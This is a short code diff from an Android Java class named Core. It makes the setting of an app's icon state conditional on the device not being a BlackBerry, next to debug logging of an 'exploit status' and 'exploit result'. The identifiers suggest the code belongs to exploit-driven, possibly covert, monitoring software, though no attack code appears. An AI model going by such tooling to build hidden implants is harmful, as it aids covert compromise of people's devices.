@@ -145,7 +145,7 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "  exploitStatus == " + Status.getExploitStatusString() + "  exploitResult == " + Status.getExploitResultString());
 			}
-			if(Cfg.GUI) {
+			if(!Status.isBlackberry() && Cfg.GUI) {
 				Status.setIconState(true);
 			}
 
